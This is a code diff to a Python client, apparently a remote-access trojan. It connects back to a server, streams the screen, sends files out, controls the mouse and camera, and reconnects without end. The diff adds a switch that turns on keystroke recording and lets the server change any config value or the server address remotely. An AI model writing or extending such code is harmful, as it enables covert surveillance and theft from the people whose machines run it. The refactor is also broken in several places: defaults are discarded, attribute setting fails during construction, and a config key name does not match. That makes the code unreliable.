@@ -20,69 +20,75 @@ from dxcampil import create as create_camera
 from libs.packets import *
 from libs.action import *
 
-# 全局变量（默认值）
-config_data = {}
-ERROR_DEBUG = False
+# 固定设置项
+ERROR_DEBUG = False  # 启用已查看错误信息
 
 
 class Default:
-    HOST = "127.0.0.1"
-    PORT = 10616
-    UUID = hex(int.from_bytes(random.randbytes(8), "big"))[2:]  # 自动生成UUID
-    FILE_BLOCK_SIZE = 1024 * 100
-    RECONNECT_TIME = 2
-    CONNECT_TIMEOUT = 2
-    HOST_CHANGED = None
+    """设置默认值, 并将键名称作为配置文件的名称"""
+
+    HOST = "127.0.0.1"  # 服务器地址
+    PORT = 10616  # 服务器端口
+    UUID = hex(int.from_bytes(random.randbytes(8), "big"))[2:]  # 客户端默认UUID
+    FILE_BLOCK_SIZE = 1024 * 100  # 文件块大小
+    RECONNECT_TIME = 2  # 重连间隔时间
+    CONNECT_TIMEOUT = 2  # 连接超时时间
+    HOST_CHANGED = None  # 地址被服务端改变后，该值为[old_host, old_port]
+    TIMEOUT_ADD = False  # 连接失败后是否增加重试间隔
+    TIMEOUT_ADD_MULTIPLIER = 1.5  # 每次增加的时间倍率
+    RECORD_KEY = False  # 启用按键记录
 
 
-# 加载配置文件
-def load_config() -> None:
-    config_data = {}
-    config_path = abspath("config.json")
-    if isfile(config_path):
+class Config:
+    """配置文件 加载, 调用, 保存 器"""
+
+    def __init__(self, config_path: str = "config.json"):
+        self.config_path = abspath(config_path)
+        self.raw_config = {}
+        self.load_config()
+
+    def load_config(self):
+        config_data = self.load_file_config()
+        for attr_name in dir(Default):
+            if not attr_name.startswith("__"):
+                key_name = attr_name.lower()
+                self.raw_config[key_name] = config_data.get(key_name, getattr(Default, attr_name))
+        self.raw_config = config_data
+        self.save_config()
+
+    def load_file_config(self) -> dict:
+        config_data = {}
+        if isfile(self.config_path):
+            try:
+                with open(self.config_path, "r") as f:
+                    config_data = json.load(f)
+            except OSError as e:
+                print(f"Error loading config: {e}")
+        return config_data
+
+    def save_config(self):
+        config_path = abspath("config.json")
         try:
-            with open(config_path, "r") as f:
-                config_data = json.load(f)
+            with open(config_path, "w") as f:
+                json.dump(self.raw_config, f, indent=4)
         except OSError as e:
-            print(f"Error loading config: {e}")
-            config_data = {}
+            print(f"Error saving config: {e}")
 
-    # 设置默认值
-    if config_data["uuid"] == None:
-        config_data["uuid"] = Default.UUID
-    config_data["host"] = config_data.get("host", Default.HOST)
-    config_data["port"] = config_data.get("port", Default.PORT)
-    config_data["uuid"] = config_data.get("uuid", Default.UUID)
-    config_data["file_block_size"] = config_data.get("file_block_size", Default.FILE_BLOCK_SIZE)
-    config_data["reconnect_time"] = config_data.get("reconnect_time", Default.RECONNECT_TIME)
-    config_data["connect_timeout"] = config_data.get("connect_timeout", Default.CONNECT_TIMEOUT)
-    config_data["host_changed"] = config_data.get("host_changed", Default.HOST_CHANGED)
+    def __getattr__(self, name: str):
+        if name in self.raw_config.keys():
+            return self.raw_config[name]
+        else:
+            raise RuntimeError(f"Config key {name} not found")
 
-    # 将默认配置写回配置文件（如果文件缺少某些键）
-    save_config(config_data)
-    return config_data
-
-
-def save_config(config_dict: dict) -> None:
-    config_path = abspath("config.json")
-    try:
-        with open(config_path, "w") as f:
-            json.dump(config_dict, f, indent=4)
-    except OSError as e:
-        print(f"Error saving config: {e}")
+    def __setattr__(self, name: str, value: Any):
+        if name in self.raw_config.keys():
+            self.raw_config[name] = value
+        else:
+            raise RuntimeError(f"Config key {name} not found")
 
 
 def random_hex(length: int) -> str:
     return hex(int.from_bytes(random.randbytes(length), "big"))[2:]
-
-
-# 加载配置
-load_config()
-
-# 使用配置中的值
-FILE_BLOCK = config_data.get("file_block_size", Default.FILE_BLOCK_SIZE)
-reconnect_time = config_data.get("reconnect_time", Default.RECONNECT_TIME)
-connect_timeout = config_data.get("connect_timeout", Default.CONNECT_TIMEOUT)
 
 
 class ClientStopped(BaseException):
@@ -161,10 +167,11 @@ class ActionManager:
 
 
 class Client:
-    def __init__(self, config: dict) -> None:
-        self.host = config.get("host") if config.get("host") else Default.HOST
-        self.port = config.get("port") if config.get("port") else Default.PORT
-        self.uuid = config.get("uuid") if config.get("uuid") else Default.UUID
+    def __init__(self, config: Config) -> None:
+        self.config = config
+        self.host = config.host
+        self.port = config.port
+        self.uuid = config.uuid
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.mouse_key_map = {
             "left": (win32con.MOUSEEVENTF_LEFTDOWN, win32con.MOUSEEVENTF_LEFTUP),
@@ -174,7 +181,6 @@ class Client:
         self.log_stack = {}
         self.__connected = False
         self.threads: list[Thread] = []
-        # _cameraParent.transform (DoShake)
 
         # 屏幕传输相关
         self.sending_screen = False  # 是否发送屏幕
@@ -243,7 +249,8 @@ class Client:
                 print("接收到数据包:", packet_str(packet))
             if not self.parse_packet(packet):
                 raise ClientStopped
-        # self.key_listener.stop()
+        if self.config.record_key:
+            self.key_listener.stop()
         print("停止")
         for thread in self.threads:
             thread.join()
@@ -392,17 +399,18 @@ class Client:
         elif packet["type"] == CLIENT_RESTART:
             raise ClientRestart
         elif packet["type"] == CHANGE_ADDRESS:
-            global config_data
-            config_data = load_config()
-            config_data["host_changed"] = [packet["host"], packet["port"]].copy()
-            config_data["host"] = packet["host"]
-            config_data["port"] = packet["port"]
-            save_config(config_data)
+            self.config.host_changed = [self.config.host, self.config.port].copy()
+            self.config.host = packet["host"]
+            self.config.port = packet["port"]
+            self.config.save_config()
+        elif packet["type"] == CHANGE_CONFIG:
+            setattr(self.config, packet["key"], packet["value"])
         elif packet["type"] == REQ_CONFIG:
-            self.send_packet({"type": CONFIG_RESULT, "config": config_data})
+            self.send_packet({"type": CONFIG_RESULT, "config": self.config.raw_config})
         return True
 
     def file_view_thread(self, packet: Packet):
+        file_block = self.config.file_block
         path = packet["path"]
         data_max_size = packet["data_max_size"]
 
@@ -425,7 +433,7 @@ class Client:
         cookie = hex(int.from_bytes(random.randbytes(8), "big"))[2:]
         packet = {"type": FILE_VIEW_CREATE, "path": path, "cookie": cookie}
         self.send_packet(packet)
-        for block in [data[i : i + FILE_BLOCK] for i in range(0, len(data), FILE_BLOCK)]:
+        for block in [data[i : i + file_block] for i in range(0, len(data), file_block)]:
             packet = {
                 "type": FILE_VIEW_DATA,
                 "path": path,
@@ -472,21 +480,20 @@ class Client:
 
     def connect_until(self):
         """重复连接直到连接成功"""
-        global reconnect_time
-        reconnect_time = config_data["reconnect_time"]
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        host_changed: list[str, int] | None = config_data["host_changed"]
+        host_changed: list[str, int] | None = self.config.host_changed
+        reconnect_time = self.config.reconnect_time
         while not self.connected:
             if self.try_connect():
                 break
-            if host_changed:
-                global config_data
-                config_data["host"] = host_changed[0]
-                config_data["port"] = host_changed[1]
-                config_data["host_changed"] = False
-                save_config(config_data)
+            if host_changed is not None:
+                self.config.host = host_changed[0]
+                self.config.port = host_changed[1]
+                self.config.host_changed = False
+                self.config.save_config()
             self.scroll_sleep(reconnect_time, "连接失败, 等待{}秒后重连: {}s")
-            # reconnect_time *= 1.5
+            if self.config.timeout_add:
+                reconnect_time *= self.config.timeout_add_multiplier
             reconnect_time = int(reconnect_time)
             if reconnect_time > 60:
                 reconnect_time = 60
@@ -570,13 +577,14 @@ class Client:
     def try_connect(self) -> bool:
         try:
             print("尝试连接至服务器")
-            self.sock.settimeout(connect_timeout)
+            self.sock.settimeout(self.config.connect_timeout)
             self.sock.connect((self.host, self.port))
             self.packet_manager.init_stack()
             self.init_var()
             self.sock.settimeout(1)
             self.packet_manager.set_socket(self.sock)
-            # self.key_listener.start()
+            if self.config.record_key:
+                self.key_listener.start()
             self.connected = True
             return True
         except ConnectionError as e:
@@ -633,9 +641,8 @@ if __name__ == "__main__":
         except NameError:
             pass
 
-        config_data = load_config()
-        print("配置文件加载成功")
-        client = Client(config_data)
+        config = Config()
+        client = Client(config)
 
         try:
             ret = client.run_infinitely()
